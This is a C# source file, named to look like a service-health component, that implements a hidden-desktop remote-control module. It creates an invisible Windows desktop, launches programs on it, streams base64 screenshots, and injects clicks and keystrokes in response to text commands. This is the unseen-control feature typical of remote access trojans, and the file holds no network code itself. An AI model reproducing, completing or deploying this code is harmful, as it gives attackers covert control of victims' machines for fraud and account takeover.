using System;
using System.Runtime.InteropServices;
using System.Text;

namespace SvcHealth
{
    static class HiddenDesktop
    {
        static IntPtr desk;
        static string deskName;
        static IntPtr origDesk;

        [DllImport("user32.dll")] static extern IntPtr GetThreadDesktop(int tid);
        [DllImport("kernel32.dll")] static extern int GetCurrentThreadId();

        public static string Handle(string command)
        {
            try
            {
                if (Environment.OSVersion.Platform != PlatformID.Win32NT) return "hidden desktop requires windows";
                int sid = 0;
                ProcessIdToSessionId(GetCurrentProcessId(), out sid);
                if (sid == 0 && Environment.GetEnvironmentVariable("SP_HD_HOST") != "1")
                    return "desktop host required session=0";
                var rest = command.Length > 5 ? command.Substring(5).Trim() : "";
                var sp = rest.IndexOf(' ');
                var action = sp < 0 ? rest : rest.Substring(0, sp);
                var arg = sp < 0 ? "" : rest.Substring(sp + 1).Trim();
                switch (action)
                {
                    case "":
                    case "start": return OnDesk(() => Start(string.IsNullOrEmpty(arg) ? @"C:\Windows\explorer.exe" : arg));
                    case "frame": return OnDesk(Frame);
                    case "click": return OnDesk(() => Click(arg, false));
                    case "rclick": return OnDesk(() => Click(arg, true));
                    case "type": return OnDesk(() => Type(arg));
                    case "key": return OnDesk(() => Key(string.IsNullOrEmpty(arg) ? 13 : int.Parse(arg)));
                    case "stop": return Stop();
                    default: return "unknown desktop action";
                }
            }
            catch (Exception ex) { return "hd err: " + ex.Message; }
        }

        static string OnDesk(Func<string> f)
        {
            if (!Ensure()) return "desktop open failed";
            origDesk = GetThreadDesktop(GetCurrentThreadId());
            if (!SetThreadDesktop(desk)) return "set desktop failed";
            try { return f(); }
            catch { return "desk err"; }
            finally
            {
                if (origDesk != IntPtr.Zero)
                {
                    SetThreadDesktop(origDesk);
                    origDesk = IntPtr.Zero;
                }
            }
        }

        static bool Ensure()
        {
            if (desk != IntPtr.Zero) return true;
            var rng = new Random();
            var chars = "abcdefghijklmnopqrstuvwxyz";
            var sb = new StringBuilder(10);
            for (int i = 0; i < 10; i++) sb.Append(chars[rng.Next(chars.Length)]);
            deskName = sb.ToString();
            desk = CreateDesktopW(deskName, null, IntPtr.Zero, 0, 0x000F01FF, IntPtr.Zero);
            if (desk == IntPtr.Zero) desk = OpenDesktopW(deskName, 0, false, 0x000F01FF);
            return desk != IntPtr.Zero;
        }

        [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hwnd, int cmd);

        static string Start(string exe)
        {
            var si = new STARTUPINFO { cb = Marshal.SizeOf(typeof(STARTUPINFO)), lpDesktop = "WinSta0\\" + deskName, dwFlags = 1, wShowWindow = 5 };
            PROCESS_INFORMATION pi;
            if (!CreateProcessW(null, exe, IntPtr.Zero, IntPtr.Zero, false, 0x10, IntPtr.Zero, null, ref si, out pi))
                return "err " + Marshal.GetLastWin32Error();
            int newPid = pi.dwProcessId;
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            System.Threading.Thread.Sleep(3000);
            var top = TopWindow();
            if (top != IntPtr.Zero) ShowWindow(top, 3);
            return "ok pid=" + newPid;
        }

        delegate bool EnumWinProc(IntPtr hwnd, IntPtr lp);
        [DllImport("user32.dll")] static extern bool EnumWindows(EnumWinProc cb, IntPtr lp);
        [DllImport("user32.dll")] static extern bool EnumDesktopWindows(IntPtr hDesktop, EnumWinProc cb, IntPtr lp);
        [DllImport("user32.dll")] static extern bool IsWindowVisible(IntPtr h);
        [DllImport("user32.dll")] static extern bool GetWindowRect(IntPtr h, out RECT r);
        [DllImport("user32.dll")] static extern bool PrintWindow(IntPtr h, IntPtr hdc, uint flags);
        [DllImport("user32.dll", CharSet = CharSet.Unicode)] static extern int GetWindowTextW(IntPtr h, StringBuilder s, int n);
        [DllImport("user32.dll")] static extern int GetWindowLong(IntPtr h, int idx);
        [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr d, int dx, int dy, int w, int h, IntPtr s, int sx, int sy, int rop);
        [DllImport("gdi32.dll")] static extern IntPtr CreateSolidBrush(int color);
        [DllImport("user32.dll")] static extern int FillRect(IntPtr hdc, ref RECT r, IntPtr brush);
        [DllImport("user32.dll")] static extern IntPtr GetWindowDC(IntPtr h);
        [StructLayout(LayoutKind.Sequential)]
        struct RECT { public int left, top, right, bottom; }

        static string Frame()
        {
            int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
            if (sw <= 0 || sh <= 0) { sw = 1280; sh = 800; }

            var screenDC = GetDC(IntPtr.Zero);
            var fullDC = CreateCompatibleDC(screenDC);
            var fullBmp = CreateCompatibleBitmap(screenDC, sw, sh);
            var fullOld = SelectObject(fullDC, fullBmp);

            var bgRect = new RECT { left = 0, top = 0, right = sw, bottom = sh };
            var bgBrush = CreateSolidBrush(0x00362D20);
            FillRect(fullDC, ref bgRect, bgBrush);
            DeleteObject(bgBrush);

            var wins = new System.Collections.Generic.List<IntPtr>();
            var allWins = new System.Collections.Generic.List<IntPtr>();

            EnumDesktopWindows(desk, delegate(IntPtr hwnd, IntPtr lp)
            {
                allWins.Add(hwnd);
                if (IsWindowVisible(hwnd))
                {
                    RECT rc;
                    if (GetWindowRect(hwnd, out rc))
                    {
                        int ww = rc.right - rc.left;
                        int wh = rc.bottom - rc.top;
                        if (ww > 1 && wh > 1) wins.Add(hwnd);
                    }
                }
                return true;
            }, IntPtr.Zero);

            if (wins.Count == 0)
            {
                EnumWindows(delegate(IntPtr hwnd, IntPtr lp)
                {
                    if (IsWindowVisible(hwnd))
                    {
                        RECT rc;
                        if (GetWindowRect(hwnd, out rc))
                        {
                            int ww = rc.right - rc.left;
                            int wh = rc.bottom - rc.top;
                            if (ww > 1 && wh > 1) wins.Add(hwnd);
                        }
                    }
                    return true;
                }, IntPtr.Zero);
            }

            int painted = 0;
            for (int i = wins.Count - 1; i >= 0; i--)
            {
                RECT rc;
                if (!GetWindowRect(wins[i], out rc)) continue;
                int ww = rc.right - rc.left;
                int wh = rc.bottom - rc.top;
                if (ww <= 0 || wh <= 0) continue;

                var wDC = CreateCompatibleDC(screenDC);
                var wBmp = CreateCompatibleBitmap(screenDC, ww, wh);
                var wOld = SelectObject(wDC, wBmp);

                if (!PrintWindow(wins[i], wDC, 2))
                {
                    var srcDC = GetWindowDC(wins[i]);
                    BitBlt(wDC, 0, 0, ww, wh, srcDC, 0, 0, 0x00CC0020);
                    ReleaseDC(wins[i], srcDC);
                }

                BitBlt(fullDC, rc.left, rc.top, ww, wh, wDC, 0, 0, 0x00CC0020);
                SelectObject(wDC, wOld);
                DeleteObject(wBmp);
                DeleteDC(wDC);
                painted++;
            }

            int stride = ((sw * 3 + 3) / 4) * 4;
            var pixels = new byte[stride * sh];
            var bi = new BITMAPINFO { biSize = 40, biWidth = sw, biHeight = sh, biPlanes = 1, biBitCount = 24 };
            GetDIBits(fullDC, fullBmp, 0, sh, pixels, ref bi, 0);
            SelectObject(fullDC, fullOld);
            DeleteObject(fullBmp);
            DeleteDC(fullDC);
            ReleaseDC(IntPtr.Zero, screenDC);
            int dw = sw, dh = sh;

            byte[] frameBytes;
            try
            {
                using (var bmp = new System.Drawing.Bitmap(dw, dh, System.Drawing.Imaging.PixelFormat.Format24bppRgb))
                {
                    var bd = bmp.LockBits(new System.Drawing.Rectangle(0, 0, dw, dh),
                        System.Drawing.Imaging.ImageLockMode.WriteOnly,
                        System.Drawing.Imaging.PixelFormat.Format24bppRgb);
                    int dstStride = bd.Stride;
                    for (int row = 0; row < dh; row++)
                    {
                        int srcOff = (dh - 1 - row) * stride;
                        IntPtr dst = new IntPtr(bd.Scan0.ToInt64() + row * dstStride);
                        Marshal.Copy(pixels, srcOff, dst, Math.Min(stride, dstStride));
                    }
                    bmp.UnlockBits(bd);
                    using (var ms = new System.IO.MemoryStream())
                    {
                        var codec = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders();
                        System.Drawing.Imaging.ImageCodecInfo jpegCodec = null;
                        for (int ci = 0; ci < codec.Length; ci++) { if (codec[ci].MimeType == "image/jpeg") { jpegCodec = codec[ci]; break; } }
                        if (jpegCodec != null)
                        {
                            var ep = new System.Drawing.Imaging.EncoderParameters(1);
                            ep.Param[0] = new System.Drawing.Imaging.EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 55L);
                            bmp.Save(ms, jpegCodec, ep);
                        }
                        else bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                        frameBytes = ms.ToArray();
                    }
                }
            }
            catch
            {
                var file = new byte[54 + pixels.Length];
                file[0] = (byte)'B'; file[1] = (byte)'M';
                BitConverter.GetBytes(file.Length).CopyTo(file, 2);
                BitConverter.GetBytes(54).CopyTo(file, 10);
                BitConverter.GetBytes(40).CopyTo(file, 14);
                BitConverter.GetBytes(dw).CopyTo(file, 18);
                BitConverter.GetBytes(dh).CopyTo(file, 22);
                file[26] = 1; file[28] = 24;
                Buffer.BlockCopy(pixels, 0, file, 54, pixels.Length);
                frameBytes = file;
            }

            return "HDIMG:" + sw + "," + sh + ":" + Convert.ToBase64String(frameBytes);
        }

        [StructLayout(LayoutKind.Sequential)]
        struct POINT { public int x, y; }
        [DllImport("user32.dll")] static extern bool SetCursorPos(int x, int y);
        [DllImport("user32.dll")] static extern IntPtr WindowFromPoint(POINT p);
        [DllImport("user32.dll")] static extern IntPtr ChildWindowFromPoint(IntPtr parent, POINT p);
        [DllImport("user32.dll")] static extern bool ScreenToClient(IntPtr h, ref POINT p);
        [DllImport("user32.dll")] static extern bool SetForegroundWindow(IntPtr h);
        [DllImport("user32.dll")] static extern bool PostMessageW(IntPtr h, uint msg, IntPtr wp, IntPtr lp);
        [DllImport("user32.dll")] static extern IntPtr SendMessageW(IntPtr h, uint msg, IntPtr wp, IntPtr lp);
        [DllImport("user32.dll")] static extern IntPtr SetFocus(IntPtr h);

        static IntPtr lastClickWnd;

        static IntPtr TopWindow()
        {
            IntPtr best = IntPtr.Zero;
            IntPtr fallback = IntPtr.Zero;
            EnumDesktopWindows(desk, delegate(IntPtr wnd, IntPtr lp)
            {
                if (!IsWindowVisible(wnd)) return true;
                int style = GetWindowLong(wnd, -16);
                if ((style & 0x40000000) != 0) return true;
                RECT rc;
                if (!GetWindowRect(wnd, out rc)) return true;
                int ww = rc.right - rc.left, wh = rc.bottom - rc.top;
                if (ww < 50 || wh < 30) return true;
                var sb = new StringBuilder(64);
                GetWindowTextW(wnd, sb, 64);
                var title = sb.ToString();
                if (title.Length == 0) return true;
                if (fallback == IntPtr.Zero) fallback = wnd;
                if (title == "Program Manager") return true;
                var cls = new StringBuilder(128);
                GetClassNameW(wnd, cls, 128);
                var cn = cls.ToString();
                if (cn == "BgInfoWindowClass" || cn == "Progman" || cn == "WorkerW") return true;
                best = wnd;
                return false;
            }, IntPtr.Zero);
            return best != IntPtr.Zero ? best : fallback;
        }

        [DllImport("user32.dll")] static extern IntPtr RealChildWindowFromPoint(IntPtr parent, POINT p);
        [DllImport("user32.dll")] static extern bool EnumChildWindows(IntPtr parent, EnumWinProc cb, IntPtr lp);
        [DllImport("user32.dll", CharSet = CharSet.Unicode)] static extern int GetClassNameW(IntPtr hwnd, StringBuilder buf, int max);

        static IntPtr lastTopWnd;

        static IntPtr FindEditChild(IntPtr parent)
        {
            IntPtr edit = IntPtr.Zero;
            EnumChildWindows(parent, delegate(IntPtr ch, IntPtr lp)
            {
                var cls = new StringBuilder(128);
                GetClassNameW(ch, cls, 128);
                var cn = cls.ToString();
                if (cn.IndexOf("Edit", StringComparison.OrdinalIgnoreCase) >= 0
                    || cn.IndexOf("RichEdit", StringComparison.OrdinalIgnoreCase) >= 0
                    || cn.IndexOf("Scintilla", StringComparison.OrdinalIgnoreCase) >= 0
                    || cn.IndexOf("InputSite", StringComparison.OrdinalIgnoreCase) >= 0)
                {
                    edit = ch;
                    return false;
                }
                return true;
            }, IntPtr.Zero);
            return edit;
        }

        static IntPtr FindAtPoint(int x, int y)
        {
            IntPtr top = IntPtr.Zero;
            EnumDesktopWindows(desk, delegate(IntPtr wnd, IntPtr lp)
            {
                if (!IsWindowVisible(wnd)) return true;
                RECT rc;
                if (!GetWindowRect(wnd, out rc)) return true;
                if (x >= rc.left && x < rc.right && y >= rc.top && y < rc.bottom)
                {
                    int style = GetWindowLong(wnd, -16);
                    if ((style & 0x40000000) == 0) { top = wnd; return false; }
                }
                return true;
            }, IntPtr.Zero);
            if (top == IntPtr.Zero)
            {
                var pt = new POINT { x = x, y = y };
                top = WindowFromPoint(pt);
            }
            if (top == IntPtr.Zero) return IntPtr.Zero;
            lastTopWnd = top;
            var cp = new POINT { x = x, y = y };
            ScreenToClient(top, ref cp);
            var child = RealChildWindowFromPoint(top, cp);
            if (child != IntPtr.Zero && child != top) return child;
            return top;
        }

        static void Attach(IntPtr hwnd, out bool attached)
        {
            attached = false;
            int myTid = GetCurrentThreadId();
            int dummy;
            int tid = GetWindowThreadProcessId(hwnd, out dummy);
            if (tid != 0 && tid != myTid) attached = AttachThreadInput(myTid, tid, true);
        }

        static string Click(string arg, bool right)
        {
            var p = arg.Split(new char[]{' ', ','}, StringSplitOptions.RemoveEmptyEntries);
            if (p.Length < 2) return "click needs x y";
            int x = int.Parse(p[0]), y = int.Parse(p[1]);

            SetCursorPos(x, y);
            var hwnd = FindAtPoint(x, y);
            if (hwnd == IntPtr.Zero) return (right ? "rclick " : "click ") + x + " " + y + " no-target";

            var topWnd = lastTopWnd != IntPtr.Zero ? lastTopWnd : hwnd;
            bool attached;
            Attach(topWnd, out attached);
            SetForegroundWindow(topWnd);
            if (hwnd != topWnd) SetFocus(hwnd);
            else SetFocus(topWnd);

            var pt = new POINT { x = x, y = y };
            ScreenToClient(hwnd, ref pt);
            IntPtr lParam = (IntPtr)(((pt.y & 0xFFFF) << 16) | (pt.x & 0xFFFF));

            if (right)
            {
                PostMessageW(hwnd, 0x0204, (IntPtr)2, lParam);
                System.Threading.Thread.Sleep(50);
                PostMessageW(hwnd, 0x0205, IntPtr.Zero, lParam);
                PostMessageW(hwnd, 0x007B, IntPtr.Zero, lParam);
            }
            else
            {
                PostMessageW(hwnd, 0x0201, (IntPtr)1, lParam);
                System.Threading.Thread.Sleep(50);
                PostMessageW(hwnd, 0x0202, IntPtr.Zero, lParam);
            }

            if (attached) { int myTid = GetCurrentThreadId(); int dummy; int tid = GetWindowThreadProcessId(topWnd, out dummy); AttachThreadInput(myTid, tid, false); }
            lastClickWnd = hwnd;
            return (right ? "rclick " : "click ") + x + " " + y;
        }

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint SendInput(uint nInputs, KBINPUT[] pInputs, int cbSize);

        [StructLayout(LayoutKind.Explicit, Size = 40)]
        struct KBINPUT
        {
            [FieldOffset(0)] public uint type;
            [FieldOffset(8)] public ushort wVk;
            [FieldOffset(10)] public ushort wScan;
            [FieldOffset(12)] public uint dwFlags;
            [FieldOffset(16)] public uint time;
            [FieldOffset(24)] public IntPtr dwExtraInfo;
        }

        static IntPtr FindRichEdit(IntPtr parent)
        {
            IntPtr found = IntPtr.Zero;
            EnumChildWindows(parent, delegate(IntPtr ch, IntPtr lp)
            {
                var cls = new StringBuilder(128);
                GetClassNameW(ch, cls, 128);
                var cn = cls.ToString();
                if (cn == "RichEditD2DPT" || cn.StartsWith("RichEdit"))
                {
                    found = ch;
                    return false;
                }
                return true;
            }, IntPtr.Zero);
            return found;
        }

        static string Type(string text)
        {
            if (string.IsNullOrEmpty(text)) return "type needs text";
            var top = lastTopWnd != IntPtr.Zero ? lastTopWnd : (lastClickWnd != IntPtr.Zero ? lastClickWnd : TopWindow());
            if (top == IntPtr.Zero) return "type: no target window";

            var editWnd = FindRichEdit(top);
            var target = editWnd != IntPtr.Zero ? editWnd : FindEditChild(top);
            if (target == IntPtr.Zero) target = lastClickWnd != IntPtr.Zero ? lastClickWnd : top;

            bool attached;
            Attach(top, out attached);
            SetForegroundWindow(top);
            SetFocus(target);
            System.Threading.Thread.Sleep(50);

            int posted = 0;
            foreach (var ch in text)
            {
                ushort c = (ushort)ch;
                if (ch == '\n' || ch == '\r') c = 13;
                PostMessageW(target, 0x0102, (IntPtr)c, IntPtr.Zero);
                posted++;
            }

            if (posted == 0)
            {
                uint sent = 0;
                int err = 0;
                foreach (var ch in text)
                {
                    ushort scan = (ushort)ch;
                    ushort vk = 0;
                    uint flags = 4;
                    if (ch == '\n' || ch == '\r') { vk = 13; scan = 0; flags = 0; }
                    var down = new KBINPUT { type = 1, wVk = vk, wScan = scan, dwFlags = flags };
                    var up = new KBINPUT { type = 1, wVk = vk, wScan = scan, dwFlags = flags | 2 };
                    var pair = new KBINPUT[] { down, up };
                    uint r = SendInput(2, pair, 40);
                    sent += r;
                    if (r == 0 && err == 0) err = Marshal.GetLastWin32Error();
                }
                return "typed " + text.Length;
            }

            if (attached) { int myTid = GetCurrentThreadId(); int dummy; int tid = GetWindowThreadProcessId(top, out dummy); AttachThreadInput(myTid, tid, false); }
            return "typed " + text.Length;
        }

        static string Key(int vk)
        {
            var fg = lastClickWnd != IntPtr.Zero ? lastClickWnd : TopWindow();
            if (fg == IntPtr.Zero) return "key: no target window";

            bool attached;
            Attach(fg, out attached);
            SetForegroundWindow(fg);

            PostMessageW(fg, 0x0100, (IntPtr)vk, IntPtr.Zero);
            PostMessageW(fg, 0x0101, (IntPtr)vk, IntPtr.Zero);
            if (attached) { int myTid = GetCurrentThreadId(); int dummy; int tid = GetWindowThreadProcessId(fg, out dummy); AttachThreadInput(myTid, tid, false); }
            return "key " + vk;
        }

        static string Stop()
        {
            if (origDesk != IntPtr.Zero)
            {
                SetThreadDesktop(origDesk);
                origDesk = IntPtr.Zero;
            }
            if (desk != IntPtr.Zero) { CloseDesktop(desk); desk = IntPtr.Zero; }
            lastClickWnd = IntPtr.Zero;
            return "desktop stopped";
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb; public string lpReserved; public string lpDesktop; public string lpTitle;
            public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
            public short wShowWindow, cbReserved2; public IntPtr lpReserved2;
            public IntPtr hStdInput, hStdOutput, hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }
        [StructLayout(LayoutKind.Sequential)]
        struct BITMAPINFO
        {
            public int biSize, biWidth, biHeight;
            public short biPlanes, biBitCount;
            public int biCompression, biSizeImage, biXPelsPerMeter, biYPelsPerMeter, biClrUsed, biClrImportant;
        }

        [DllImport("user32.dll", CharSet = CharSet.Unicode)] static extern IntPtr CreateDesktopW(string n, string d, IntPtr dm, int f, int acc, IntPtr sa);
        [DllImport("user32.dll", CharSet = CharSet.Unicode)] static extern IntPtr OpenDesktopW(string n, int f, bool inherit, int acc);
        [DllImport("user32.dll")] static extern bool SetThreadDesktop(IntPtr h);
        [DllImport("user32.dll")] static extern bool CloseDesktop(IntPtr h);
        [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr h);
        [DllImport("user32.dll")] static extern int ReleaseDC(IntPtr h, IntPtr hdc);
        [DllImport("user32.dll")] static extern int GetSystemMetrics(int i);
        [DllImport("user32.dll")] static extern bool AttachThreadInput(int idAttach, int idTarget, bool fAttach);
        [DllImport("user32.dll")] static extern int GetWindowThreadProcessId(IntPtr hWnd, out int pid);
        [DllImport("gdi32.dll")] static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32.dll")] static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int w, int h);
        [DllImport("gdi32.dll")] static extern IntPtr SelectObject(IntPtr hdc, IntPtr o);
        [DllImport("gdi32.dll")] static extern int GetDIBits(IntPtr hdc, IntPtr bmp, int start, int lines, byte[] bits, ref BITMAPINFO bi, int usage);
        [DllImport("gdi32.dll")] static extern bool DeleteObject(IntPtr o);
        [DllImport("gdi32.dll")] static extern bool DeleteDC(IntPtr hdc);
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)] static extern bool CreateProcessW(string app, string cmd, IntPtr pa, IntPtr ta, bool inherit, int flags, IntPtr env, string dir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
        [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
        [DllImport("kernel32.dll")] static extern int GetCurrentProcessId();
        [DllImport("kernel32.dll")] static extern bool ProcessIdToSessionId(int pid, out int sid);
    }
}
